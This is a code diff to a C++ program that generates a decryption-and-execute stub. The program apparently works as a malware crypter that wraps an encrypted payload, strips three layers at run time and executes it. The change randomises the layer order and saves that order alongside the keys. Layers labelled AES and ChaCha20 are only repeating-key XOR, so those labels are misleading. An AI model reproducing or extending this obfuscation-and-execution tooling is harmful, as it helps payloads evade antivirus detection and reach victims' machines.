@@ -375,21 +375,32 @@ std::vector<uint8_t> decToBytes(const std::string& dec, size_t len) {
         stub << "    std::vector<uint8_t> data(" << v8 << " + 8, " << v8 << " + " 
              << (encrypted.size() + 8) << ");\n\n";
         
-        stub << "    // Triple decryption\n";
-        stub << "    // Layer 3: AES\n";
-        stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
-        stub << "        data[i] ^= k1[i % 16];\n";
-        stub << "    }\n\n";
+        stub << "    // Triple decryption (in reverse order)\n";
         
-        stub << "    // Layer 2: ChaCha20\n";
-        stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
-        stub << "        data[i] ^= k2[i % 32];\n";
-        stub << "    }\n\n";
-        
-        stub << "    // Layer 1: XOR\n";
-        stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
-        stub << "        data[i] ^= k3[i % k3.size()];\n";
-        stub << "    }\n\n";
+        // Apply decryption in reverse order
+        for (int i = 2; i >= 0; i--) {
+            int method = keys.encryptionOrder[i];
+            switch (method) {
+                case 0: // AES
+                    stub << "    // Layer: AES\n";
+                    stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
+                    stub << "        data[i] ^= k1[i % 16];\n";
+                    stub << "    }\n\n";
+                    break;
+                case 1: // ChaCha20
+                    stub << "    // Layer: ChaCha20\n";
+                    stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
+                    stub << "        data[i] ^= k2[i % 32];\n";
+                    stub << "    }\n\n";
+                    break;
+                case 2: // XOR
+                    stub << "    // Layer: XOR\n";
+                    stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
+                    stub << "        data[i] ^= k3[i % k3.size()];\n";
+                    stub << "    }\n\n";
+                    break;
+            }
+        }
         
         stub << "    // Execute\n";
         stub << "#ifdef _WIN32\n";
@@ -445,6 +456,7 @@ std::vector<uint8_t> decToBytes(const std::string& dec, size_t len) {
         keyFile << "N1: " << bytesToBigDecimal(keys.aesNonce, 16) << std::endl;
         keyFile << "N2: " << bytesToBigDecimal(keys.chachaNonce, 12) << std::endl;
         keyFile << "XL: " << keys.xorKeyLen << std::endl;
+        keyFile << "EO: " << keys.encryptionOrder[0] << " " << keys.encryptionOrder[1] << " " << keys.encryptionOrder[2] << std::endl;
         keyFile.close();
         
         return true;
